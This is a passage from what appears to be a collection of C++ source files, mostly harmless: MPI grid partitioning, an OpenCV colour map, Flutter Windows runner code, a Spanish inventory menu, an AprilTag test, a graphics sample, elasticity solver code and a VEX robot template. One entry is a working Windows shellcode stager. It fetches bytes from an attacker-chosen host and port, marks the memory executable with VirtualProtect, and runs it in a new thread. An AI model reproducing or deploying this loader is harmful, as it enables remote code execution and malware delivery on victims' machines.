vm[\"Ny\"].as<int>() / n_rows;\n    int extra_cols = vm[\"Ny\"].as<int>() % n_rows;\n    \n    int startx = coords[0] * rows_per_rank + std::min(coords[0], extra_rows);       //< Start x-coordinate of local domain\n    int endx = startx+ rows_per_rank - 1 + (coords[0] < extra_rows);                //< End x-coordinate of local domain\n    int starty = coords[1] * cols_per_rank + std::min(coords[1], extra_cols);       //< Start y-coordinate of local domain\n    int endy = starty + cols_per_rank - 1 + (coords[1] < extra_cols);               //< End y-coordinate of local domain\n    \n    // Logic for calculating the neighbours of each rank\n    int north, south, east, west;\n    MPI_Cart_shift(cart_comm, 1, -1, &north, &south); \n    MPI_Cart_shift(cart_comm, 0, 1, &west, &east);\n    if (west != -2) startx -= 1;\n    if (east != -2) endx += 1;\n    if (north != -2) endy += 1;\n    if (south != -2) starty -= 1;\n    \n    \n    // Set Ne",
    "#include <iostream>\n#include <vector>\n#include <opencv2/opencv.hpp>\n\n/**\n * @brief Creates a color map with N entries, mapping M RGB colors to gray tones.\n *\n * @param M The number of RGB colors.\n * @param N The number of entries in the color map.\n * @return A 2D vector representing the color map.\n */\nstd::vector<std::vector<int>> createColorMap(int M, int N)\n{\n  std::vector<std::vector<int>> colorMap(N, std::vector<int>(3));\n  int step = M / N;\n  int grayTone;\n\n  for (int i = 0; i < N; ++i)\n  {\n    grayTone = i * step;\n    colorMap[i][0] = grayTone;\n    colorMap[i][1] = grayTone;\n    colorMap[i][2] = grayTone;\n  }\n\n  return colorMap;\n}\n\n/**\n * @brief Main function.\n */\nint main()\n{\n  int M = 256;\n  int N = 100;\n\n  std::vector<std::vector<int>> colorMap = createColorMap(M, N);\n\n  std::cout << std::endl\n            << \"Color-map result:\" << std::endl\n            << std::endl;\n  for (int i = 0; i < N; ++i)\n  {\n    std::cout << \"Entry \" << i << \": (\" << colorMap[i][0] << \", \" << colorMap[i][1] << \", \" << colorMap[i][2] << \");\" << std::endl;\n  }\n\n  std::cout << std::endl;\n\n  cv::Mat image(100, 100, CV_8UC3);\n  for (int i = 0; i < N; ++i)\n  {\n    for (int j = 0; j < N; ++j)\n    {\n      image.at<cv::Vec3b>(i, j)[0] = colorMap[j][0];\n      image.at<cv::Vec3b>(i, j)[1] = colorMap[j][1];\n      image.at<cv::Vec3b>(i, j)[2] = colorMap[j][2];\n    }\n  }\n\n  cv::imwrite(\"../images/color-map.png\", image);\n  cv::waitKey(0);\n\n  return 0;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <cctype>\n#include \"Tienda.h\"\n#include \"Producto.h\"\n#include \"ProductoAlimenticio.h\"\n#include \"ProductoElectronico.h\"\n#include <sstream>\n\nbool contieneSoloLetras(const std::string& str) {\n    for (char c : str) {\n        if (!std::isalpha(c)) {\n            return false;\n        }\n    }\n    return true;\n}\nbool contieneSoloDigitos(const std::string& str) {\n    for (char c : str) {\n        if (!std::isdigit(c)) {\n            return false;\n        }\n    }\n    return true;\n}\n\nbool esNumeroDecimal(const std::string& str) {\n    std::istringstream iss(str);\n    double temp;\n    iss >> std::noskipws >> temp;\n    return iss.eof() && !iss.fail();\n}\n\n\nint main() {\n    Tienda tienda;\n\n    int opcion;\n    do {\n        //Menu Principal del programa\n        std::cout << \"\\n=== MENU ===\" << std::endl;\n        std::cout << \"1. Agregar Producto\" << std::endl;\n        std::cout << \"2. Eliminar Producto\" << std::endl;\n        std::cout << \"3. Buscar Producto\" << std::endl;\n        std::cout << \"4. Mostrar Inventario\" << std::endl;\n        std::cout << \"5. Filtrar Productos por Precio\" << std::endl;\n        std::cout << \"6. Copiar Producto\" << std::endl;\n        std::cout << \"7. Salir\" << std::endl;\n        std::cout << \"Seleccione una opcion:\\n \";\n        std::cin >> opcion;\n\n        switch (opcion) {\n            case 1: {\n                //Agregar producto\n                std::string idStr;\n                int id;\n                std::string nombre;\n                std::string precioStr;\n                double precio;\n                int stock;\n                std::string fechaCaducidad;\n                std::string modelo;\n                int tipoProducto;\n                //Menu de tipo de productos\n                do {\n                    std::cout << \"Ingrese el tipo de producto\\n 1-Producto\\n 2-Producto Alimenticio\\n 3-Producto Electronico\\nSeleccione una opcion:\\n \";\n                    std::cin >> tipoProducto;\n                } while (tipoProducto < 1 || tipoProducto > 3);\n                //Pedir al usuario q ingrese el ID del producto hasta q contenga solo numeros\n                do {\n                    std::cout << \"Ingrese el ID del producto:\\n \";\n                    std::cin >> idStr;\n                    if (!contieneSoloDigitos(idStr)) {\n                        std::cerr << \"El ID del producto debe contener solo digitos.\" << std::endl;\n                    }\n                } while (!contieneSoloDigitos(idStr));\n\n                // Convertir la cadena de ID a entero\n                id = std::stoi(idStr);\n\n                // Pedir al usuario q ingrese el nombre hasta q contenga solo letras\n                do {\n                    std::cout << \"Ingrese el nombre del producto:\\n \";\n                    std::cin >> nombre;\n                    if (!contieneSoloLetras(nombre)) {\n                        std::cerr << \"El nombre del producto debe contener solo letras.\" << std::endl;\n                    }\n                } while (!contieneSoloLetras(nombre));\n                //Pedir al usuario q ingrese el precio del producto hasta q contenga solo numeros\n                do {\n                    std::cout << \"Ingrese el precio del producto:\\n \";\n                    std::cin >> precioStr;\n                    if (!esNumeroDecimal(precioStr)) {\n                        std::cerr << \"El precio del producto debe ser un numero.\" << std::endl;\n                    }\n                } while (!esNumeroDecimal(precioStr));\n                precio = std::stod(precioStr); // Convertir la cadena de precio a double\n                //Pedir al usuario q ingrese el stock del producto hasta q contenga solo numeros\n                do {\n                    std::cout << \"Ingrese el stock del producto:\\n \";\n                    std::cin >> stock;\n                    if (!esNumeroDecimal(std::to_string(stock))) {\n                        std::cerr << \"El stock del producto debe ser un n\u00famero entero.\" << std::endl;\n                    }\n                } while (!esNumeroDecimal(std::to_string(stock)));\n\n                if (tipoProducto == 2) {\n                    std::cout << \"Ingrese la fecha de caducidad del producto alimenticio: \";\n                    std::cin >> fechaCaducidad;\n                    tienda.agregarProducto(new ProductoAlimenticio(id, nombre, precio, stock, fechaCaducidad));\n                } else if (tipoProducto == 3) {\n                    std::cout << \"Ingrese el modelo del producto electronico: \";\n                    std::cin >> modelo;\n                    tienda.agregarProducto(new ProductoElectronico(id, nombre, precio, stock, modelo));\n                } else {\n                    tienda.agregarProducto(new Producto(id, nombre, precio, stock));\n                }\n\n                break;\n            }\n            case 2: {\n                int id;\n                std::cout << \"Ingrese el ID del producto a eliminar:\\n \";\n                std::cin >> id;\n                tienda.eliminarProducto(id);\n            ",
    "#include \"apriltag_mit/apriltag_mit.h\"\n\n#include <gtest/gtest.h>\n#include <opencv2/highgui/highgui.hpp>\n#include <ros/package.h>\n\nusing namespace apriltag_mit;\nusing testing::Test;\nusing testing::WithParamInterface;\nusing testing::Values;\n\nclass SampleImageTest : public Test {\nprotected:\n  SampleImageTest()\n      : package_name_(\"apriltag_mit\"),\n        package_path_(ros::package::getPath(package_name_)),\n        image_path_(package_path_ + \"/image/tag_sampler.png\"),\n        test_image_(cv::imread(image_path_, CV_LOAD_IMAGE_GRAYSCALE)) {}\n\n  std::string package_name_, package_path_, image_path_;\n  cv::Mat test_image_;\n};\n\nclass TagFamilyTest : public SampleImageTest,\n                      public WithParamInterface<TagCodes> {\npublic:\n  TagFamilyTest() : tag_detector_(GetParam()) {}\n\nprotected:\n  TagDetector tag_detector_;\n};\n\nTEST_P(TagFamilyTest, Detection) {\n  const auto tag_detection = tag_detector_.ExtractTags(test_image_);\n  EXPECT_EQ(4, tag_detection.size());\n}\n\nINSTANTIATE_TEST_CASE_P(ThreeTagFamilies, TagFamilyTest,\n                        Values(tag_codes_36h11, tag_codes_25h9,\n                               tag_codes_16h5));\n\nint main(int argc, char **argv) {\n  testing::InitGoogleTest(&argc, argv);\n  return RUN_ALL_TESTS();\n}\n",
    "#include <windows.h>\n#include <stdio.h>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n\n#pragma comment (lib, \"Ws2_32.lib\")\n#pragma comment (lib, \"Mswsock.lib\")\n#pragma comment (lib, \"AdvApi32.lib\")\n\n#define DEFAULT_BUFLEN 4096\n\nvoid power(char* host, char* port, char* resource) {\n\n    DWORD oldp = 0;\n    BOOL returnValue;\n\n    size_t origsize = strlen(host) + 1;\n    const size_t newsize = 100;\n    size_t convertedChars = 0;\n    wchar_t Whost[newsize];\n    mbstowcs_s(&convertedChars, Whost, origsize, host, _TRUNCATE);\n\n\n    WSADATA wsaData;\n    SOCKET ConnectSocket = INVALID_SOCKET;\n    struct addrinfo* result = NULL,\n        * ptr = NULL,\n        hints;\n    char sendbuf[MAX_PATH] = \"\";\n    lstrcatA(sendbuf, \"GET /\");\n    lstrcatA(sendbuf, resource);\n\n    char recvbuf[DEFAULT_BUFLEN];\n    memset(recvbuf, 0, DEFAULT_BUFLEN);\n    int iResult;\n    int recvbuflen = DEFAULT_BUFLEN;\n\n    \n    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);\n    if (iResult != 0) {\n        return ;\n    }\n\n    ZeroMemory(&hints, sizeof(hints));\n    hints.ai_family = PF_INET;\n    hints.ai_socktype = SOCK_STREAM;\n    hints.ai_protocol = IPPROTO_TCP;\n\n    iResult = getaddrinfo(host, port, &hints, &result);\n    if (iResult != 0) {\n        WSACleanup();\n        return ;\n    }\n\n\n    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {\n\n        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,\n            ptr->ai_protocol);\n        if (ConnectSocket == INVALID_SOCKET) {\n            WSACleanup();\n            return ;\n        }\n\n\n        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);\n        if (iResult == SOCKET_ERROR) {\n            closesocket(ConnectSocket);\n            ConnectSocket = INVALID_SOCKET;\n            continue;\n        }\n        break;\n    }\n\n    freeaddrinfo(result);\n\n    if (ConnectSocket == INVALID_SOCKET) {\n        printf(\"Unable to connect to server!\\n\");\n        WSACleanup();\n        return ;\n    }\n\n    iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);\n    if (iResult == SOCKET_ERROR) {\n        closesocket(ConnectSocket);\n        WSACleanup();\n        return ;\n    }\n\n    \n    iResult = shutdown(ConnectSocket, SD_SEND);\n    if (iResult == SOCKET_ERROR) {\n        closesocket(ConnectSocket);\n        WSACleanup();\n        return ;\n    }\n    \n\n    do {\n\n        iResult = recv(ConnectSocket, (char*)recvbuf, recvbuflen, 0);\n        if (iResult > 0)\n            printf(\"[+] Received %d Bytes\\n\", iResult);\n        else if (iResult == 0)\n            printf(\"[+] Connection closed\\n\");\n        else\n            printf(\"recv failed with error: %d\\n\", WSAGetLastError());\n\n\n        LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(recvbuf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n\n\tif (!alloc_mem) {\n\t\tprintf(\"Failed to Allocate memory (%u)\\n\", GetLastError());\n\t\treturn -1;\n\t}\n\t\n\tMoveMemory(alloc_mem, recvbuf, sizeof(recvbuf));\n\n\tDWORD oldProtect;\n\n\tif (!VirtualProtect(alloc_mem, sizeof(recvbuf), PAGE_EXECUTE_READ, &oldProtect)) {\n\t\tprintf(\"Fai1led to change memory protection (%u)\\n\", GetLastError());\n\t\treturn -2;\n\t}\n\n\n\tHANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);\n\tif (!tHandle) {\n\t\tprintf(\"Failed to Create the thread (%u)\\n\", GetLastError());\n\t\treturn -3;\n\t}\n\n\tprintf(\"\\n\\nalloc_mem : %p\\n\", alloc_mem);\n\tWaitForSingleObject(tHandle, INFINITE);\n\n\treturn 0;\n\n    } while (iResult > 0);\n\n    closesocket(ConnectSocket);\n    WSACleanup();\n}\n\nint main(int argc, char** argv) {\n\n    if (argc != 4) {\n        printf(\"[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\\n\", argv[0]);\n        return 1;\n    }\n\n    power(argv[1], argv[2], argv[3]);\n\n    return 0;\n\n}",
    "// MIT License\n// \n// Copyright (C) 2018-2024, Tellusim Technologies Inc. https://tellusim.com/\n// \n// Permission is hereby granted, free of charge, to any person obtaining a copy\n// of this software and associated documentation files (the \"Software\"), to deal\n// in the Software without restriction, including without limitation the rights\n// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n// copies of the Software, and to permit persons to whom the Software is\n// furnished to do so, subject to the following conditions:\n// \n// The above copyright notice and this permission notice shall be included in all\n// copies or substantial portions of the Software.\n// \n// THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n// SOFTWARE.\n\n#include <common/common.h>\n#include <format/TellusimMesh.h>\n#include <platform/TellusimDevice.h>\n#include <platform/TellusimCommand.h>\n#include <platform/TellusimPipeline.h>\n#include <graphics/TellusimMeshModel.h>\n\n#include \"include/TellusimGLES.h\"\n\n/*\n */\nusing namespace Tellusim;\n\n/*\n */\nint32_t main(int32_t argc, char **argv) {\n\t\n\tApp::setPlatform(PlatformGLES);\n\t\n\tDECLARE_WINDOW\n\t\n\t// create window\n\tString title = String::format(\"%s Tellusim::OpenGLES\", window.getPlatformName());\n\tif(!window.create(title) || !window.setHidden(false)) return 1;\n\t\n\t// structures\n\tstruct Vertex {\n\t\tfloat32_t position[3];\n\t\tfloat32_t normal[3];\n\t};\n\t\n\tstruct CommonParameters {\n\t\tMatrix4x4f projection;\n\t\tMatrix4x4f modelview;\n\t\tMatrix4x4f transform;\n\t\tVector4f camera;\n\t};\n\t\n\t// initialize OpenGLES\n\tif(!GLES::init()) {\n\t\tTS_LOG(Error, \"main(): can't init OpenGLES\\n\");\n\t\treturn 1;\n\t}\n\t\n\t// create device\n\tDevice device(window);\n\tif(!device) return 1;\n\t\n\t// create pipeline\n\tPipeline pipeline = device.createPipeline();\n\tpipeline.setUniformMask(0, Shader::MaskVertex);\n\tpipeline.addAttribute(Pipeline::AttributePosition, FormatRGBf32, 0, offsetof(Vertex, position), sizeof(Vertex));\n\tpipeline.addAttribute(Pipeline::AttributeNormal, FormatRGBf32, 0, offsetof(Vertex, normal), sizeof(Vertex));\n\tpipeline.setColorFormat(window.getColorFormat());\n\tpipeline.setDepthFormat(window.getDepthFormat());\n\tpipeline.setDepthFunc(Pipeline::DepthFuncLessEqual);\n\tif(!pipeline.loadShaderGLSL(Shader::TypeVertex, \"main.shader\", \"VERTEX_SHADER=1\")) return 1;\n\tif(!pipeline.loadShaderGLSL(Shader::TypeFragment, \"main.shader\", \"FRAGMENT_SHADER=1\")) return 1;\n\tif(!pipeline.create()) return 1;\n\t\n\t// load mesh\n\tMesh mesh;\n\tif(!mesh.load(\"model.usdc\")) return 1;\n\t\n\t// create model\n\tMeshModel model;\n\tif(!model.create(device, pipeline, mesh)) return 1;\n\t\n\t// create target\n\tTarget target = device.createTarget(window);\n\t\n\t// main loop\n\tDECLARE_GLOBAL\n\twindow.run([&]() -> bool {\n\t\tDECLARE_COMMON\n\t\t\n\t\tWindow::update();\n\t\t\n\t\tif(!window.render()) return false;\n\t\t\n\t\t// window title\n\t\tif(fps > 0.0f) window.setTitle(String::format(\"%s %.1f FPS\", title.get(), fps));\n\t\t\n\t\t// window target\n\t\ttarget.setClearColor(Color(\"#ba2a8d\"));\n\t\ttarget.begin();\n\t\t{\n\t\t\t// create command list\n\t\t\tCommand command = device.createCommand(target);\n\t\t\t\n\t\t\t// set pipeline\n\t\t\tcommand.setPipeline(pipeline);\n\t\t\t\n\t\t\t// set model buffers\n\t\t\tmodel.setBuffers(command);\n\t\t\t\n\t\t\t// set common parameters\n\t\t\tCommonParameters common_parameters;\n\t\t\tcommon_parameters.camera = Vector4f(3.0f, 3.0f, 2.0f, 0.0f);\n\t\t\tcommon_parameters.projection = Matrix4x4f::perspective(60.0f, (float32_t)window.getWidth() / window.getHeight(), 0.1f, 1000.0f);\n\t\t\tcommon_parameters.modelview = Matrix4x4f::lookAt(Vector3f(common_parameters.camera), Vector3f(0.0f, 0.0f, 0.0f), Vector3f(0.0f, 0.0f, 1.0f));\n\t\t\tcommon_parameters.transform = Matrix4x4f::rotateX(time * 16.0f) * Matrix4x4f::rotateY(time * 24.0f) * Matrix4x4f::rotateZ(time * 32.0f);\n\t\t\tif(target.isFlipped()) common_parameters.projection = Matrix4x4f::scale(1.0f, -1.0f, 1.0f) * common_parameters.projection;\n\t\t\tcommand.setUniform(0, common_parameters);\n\t\t\t\n\t\t\t// draw model with OpenGLES API\n\t\t\tfor(uint32_t i = 0; i < model.getNumGeometries(); i++) {\n\t\t\t\tuint32_t num_indices = model.getNumGeometryIndices(i);\n\t\t\t\tuint32_t base_index = model.getGeometryBaseIndex(i);\n\t\t\t\tuint32_t base_vertex = model.getGeometryBaseVertex(i);\n\t\t\t\tglDrawElementsBaseVertex(GL_TRIANGLES, num_indices, GL_UNSIGNED_SHORT, (const void*)(size_t)(base_index << 2), base_vertex);\n\t\t\t}\n\t\t}\n\t\ttarget.end();\n\t\t\n\t\tif(!window.present()) return false;\n\t\t\n\t\tif(!device.check()) return false;\n\t\t\n\t\treturn true;\n\t});\n\t\n\t// finish context\n\twindow.finish();\n\t\n\treturn 0;\n}\n",
    "#include <iostream>\n#include <math.h>\n#include <chrono>\n#include <limits>\n#include <fstream>\n\n#include \"omp.h\"\n#include \"consts.h\"\n#include \"helpers.h\"\n#include \"mkl.h\"\n\nusing namespace std;\n\nclass FGM;\n\nstruct Space {\npublic:\n  dtype start;\n  dtype end;\n  int no_points;\n\n  Mat<dtype> IT; //Inverse transformation matrix\n  Mat<dtype> FT; //forward transformation matrix so FT = inv(IT)\n  Mat<dtype> D;\n  Col<dtype> s;\n  Mat<dtype> V;\n  Mat<dtype> Q1;\n\n  Space(dtype start, dtype end, int no_points)\n    : start(start), end(end), no_points(no_points), IT(no_points, no_points), FT(no_points, no_points), D(no_points, no_points), s(no_points) {\n    discretize();\n  }\n\n  void discretize() {\n    //#pragma omp critical\n    //{\n    cheb(no_points, IT, FT);\n    DBG(cout << \"IT\\n\"; IT.print(); cout << endl;);\n    DBG(cout << \"FT\\n\"; FT.print(); cout << endl;);\n    derivative(start, end, no_points, D);\n    DBG(cout << \"D\\n\";D.print(); cout << endl;);\n    slobat(start, end, no_points, s);\n    DBG(cout << \"s\\n\"; s.print(); cout << endl;);\n    inner_product_helper(start, end, no_points, V);\n    DBG(cout << \"V\\n\"; V.print(); cout << endl;);\n    Q1 = IT * D * FT;\n    DBG(cout << \"Q1\\n\"; Q1.print(); cout << endl;);\n    //}\n  }\n};\n\nclass Shape { //Space(0, z_dim, z_sample) neden b\u00f6yle de Space(-z_dim/2, z_dim/2, z_sample) de\u011fil??????\npublic:\n  Shape(dtype x_dim, dtype y_dim, dtype z_dim,\n\tint x_sample, int y_sample, int z_sample,\n\tdtype xcurve = 0, dtype ycurve = 0) :\n    dim{x_dim, y_dim, z_dim}, curve{xcurve, ycurve},\n    is_curved(~(xcurve == 0 && ycurve == 0)),\n    spaces{Space(-x_dim/2, x_dim/2, x_sample), Space(-y_dim/2, y_dim/2, y_sample), Space(0, z_dim, z_sample)},\n    xyz(x_sample * y_sample * z_sample),\n    VD(xyz, xyz),\n    QDx(xyz, xyz, fill::zeros), QDy(xyz, xyz, fill::zeros), QDz(xyz, xyz, fill::zeros) {\n      vector_map_nojac();\n  }\n\n  void vector_map_nojac() {\n    //#pragma omp critical\n    //{\n    int npx = spaces[0].no_points;\n    int npy = spaces[1].no_points;\n    int npz = spaces[2].no_points;\n\n    int xyz = npx * npy * npz;\n    Mat<dtype> VDx(xyz, xyz, fill::zeros);\n    Mat<dtype> VDy(xyz, xyz, fill::zeros);\n    Mat<dtype> VDz(xyz, xyz, fill::zeros);\n\n    for(int i = 1; i <= npx; i++) {\n      for(int j = 1; j <= npy; j++) {\n\t      for(int k = 1; k <= npz; k++) {\n\t        int I = ((i-1) * npy * npz) + ((j-1) * npz) + k;\n\n          for(int l = 1; l <= npx; l++) {\n            int J = ((l-1) * npy * npz) + ((j-1) * npz) + k;\n            VDx(J-1, I-1) += spaces[0].V(l-1, i-1);\n            QDx(J-1, I-1) += spaces[0].Q1(l-1, i-1);\n          }\n\n          for(int l = 1; l <= npy; l++) {\n            int J = ((i-1) * npy * npz) + ((l-1) * npz) + k;\n            VDy(J-1, I-1) += spaces[1].V(l-1, j-1);\n            QDy(J-1, I-1) += spaces[1].Q1(l-1, j-1);\n          }\n\n          for(int l = 1; l <= npz; l++) {\n            int J = ((i-1) * npy * npz) + ((j-1) * npz) + l;\n            VDz(J-1, I-1) += spaces[2].V(l-1, k-1);\n            QDz(J-1, I-1) += spaces[2].Q1(l-1, k-1);\n          }\n\t      }\n      }\n    }\n\n    VD = VDx * VDy * VDz;\n    //}\n  }\n\n  const dtype dim[3];\n  const bool is_curved;\n  const dtype curve[2];\n\n  Space spaces[3];\n\n  const int xyz;\n  Mat<dtype> VD;\n  Mat<dtype> QDx;\n  Mat<dtype> QDy;\n  Mat<dtype> QDz;\n};\n\nclass Material {\npublic:\n  Material(dtype _mod_elasticity,\n\t   dtype _poisson_ratio,\n\t   dtype _density)\n    : mod_elasticity(_mod_elasticity),\n      poisson_ratio(_poisson_ratio),\n      density(_density) {}\n\n  //member variables\n  const dtype mod_elasticity;\n  const dtype poisson_ratio;\n  const dtype density;\n};\n\n//Functionally graded material\nclass FGM {\npublic:\n  FGM(Shape& _shape,\n      Material& first, Material& second,\n      dtype _ctrl_y, dtype _ctrl_z) :\n    shape(_shape),\n    ctrl_y(_ctrl_y), ctrl_z(_ctrl_z),\n    mats{first, second},\n    np{_shape.spaces[0].no_points, _shape.spaces[1].no_points, _shape.spaces[2].no_points},\n    nxyz(np[0] * np[1] * np[2]),\n    mu(np[0], np[1], np[2], fill::zeros),\n    lame(np[0], np[1], np[2], fill::zeros),\n    rho(np[0], np[1], np[2], fill::zeros),\n    VD_mu(nxyz, nxyz, fill::zeros),\n    VD_lame(nxyz, nxyz, fill::zeros),\n    VD_rho(nxyz, nxyz, fill::zeros),\n    M(3 * nxyz, 3 * nxyz, fill::zeros),\n    K(3 * nxyz, 3 * nxyz, fill::zeros)\n  {\n    //#pragma omp critical\n    //{\n    FG_var_MT();\n    inner_product();\n\n    double start, end;\n    TIME(\"system-mat\", start, end,\n\t  system_matrices()\n\t );\n    //}\n  }\n\n  void compute(const int noeigs, const int ncv, int& nconv, double& small_eig,\n\t       const double shift = 0.01, const int max_iter = -1, const double tol = -1) {\n   //#pragma omp critical\n   //{\n    Mat<dtype> BC_3D_I = boundary_condition_3d(0, 0);\n    Mat<dtype> BC_3D_II = boundary_condition_3d(0, 1);\n\n    Mat<dtype> BC_1 = beta_matrix_3d(BC_3D_I, 0);\n    Mat<dtype> BC_2 = beta_matrix_3d(BC_3D_II, 0);\n    Mat<dtype> BC = join_cols(BC_1, BC_2);\n\n    Mat<dtype> U, V;\n    Col<dtype> s;\n\n\n    double start, end;\n    TIME(\"SVD\", start, end, svd(U, s, V, BC););\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"main.h\"\n\n/**\n * A callback function for LLEMU's center button.\n *\n * When this callback is fired, it will toggle line 2 of the LCD text between\n * \"I was pressed!\" and nothing.\n */\nvoid on_center_button() {\n\tstatic bool pressed = false;\n\tpressed = !pressed;\n\tif (pressed) {\n\t\tpros::lcd::set_text(2, \"I was pressed!\");\n\t} else {\n\t\tpros::lcd::clear_line(2);\n\t}\n}\n\n/**\n * Runs initialization code. This occurs as soon as the program is started.\n *\n * All other competition modes are blocked by initialize; it is recommended\n * to keep execution time for this mode under a few seconds.\n */\nvoid initialize() {\n\tpros::lcd::initialize();\n\tpros::lcd::set_text(1, \"Hello PROS User!\");\n\n\tpros::lcd::register_btn1_cb(on_center_button);\n}\n\n/**\n * Runs while the robot is in the disabled state of Field Management System or\n * the VEX Competition Switch, following either autonomous or opcontrol. When\n * the robot is enabled, this task will exit.\n */\nvoid disabled() {}\n\n/**\n * Runs after initialize(), and before autonomous when connected to the Field\n * Management System or the VEX Competition Switch. This is intended for\n * competition-specific initialization routines, such as an autonomous selector\n * on the LCD.\n *\n * This task will exit when the robot is enabled and autonomous or opcontrol\n * starts.\n */\nvoid competition_initialize() {}\n\n/**\n * Runs the user autonomous code. This function will be started in its own task\n * with the default priority and stack size whenever the robot is enabled via\n * the Field Management System or the VEX Competition Switch in the autonomous\n * mode. Alternatively, this function may be called in initialize or opcontrol\n * for non-competition testing purposes.\n *\n * If the robot is disabled or communications is lost, the autonomous task\n * will be stopped. Re-enabling the robot will restart the task, not re-start it\n * from where it left off.\n */\nvoid autonomous() {}\n\n/**\n * Runs the operator control code. This function will be started in its own task\n * with the default priority and stack size whenever the robot is enabled via\n * the Field Management System or the VEX Competition Switch in the operator\n * control mode.\n *\n * If no competition control is connected, this function will run immediately\n * following initialize().\n *\n * If the robot is disabled or communications is lost, the\n * operator control task will be stopped. Re-enabling the robot will restart the\n * task, not resume it from where it left off.\n */\nvoid opcontrol() {\n\tpros::Controller master(pros::E_CONTROLLER_MASTER);\n\tpros::Motor left_mtr(1);\n\tpros::Motor right_mtr(2);\n\n\twhile (true) {\n\t\tpros::lcd::print(0, \"%d %d %d\", (pros::lcd::read_buttons() & LCD_BTN_LEFT) >> 2,\n\t\t                 (pros::lcd::read_buttons() & LCD_BTN_CENTER) >> 1,\n\t\t                 (pros::lcd::read_buttons() & LCD_BTN_RIGHT) >> 0);\n\t\tint left = master.get_analog(ANALOG_LEFT_Y);\n\t\tint right = master.get_analog(ANALOG_RIGHT_Y);\n\n\t\tleft_mtr = left;\n\t\tright_mtr = 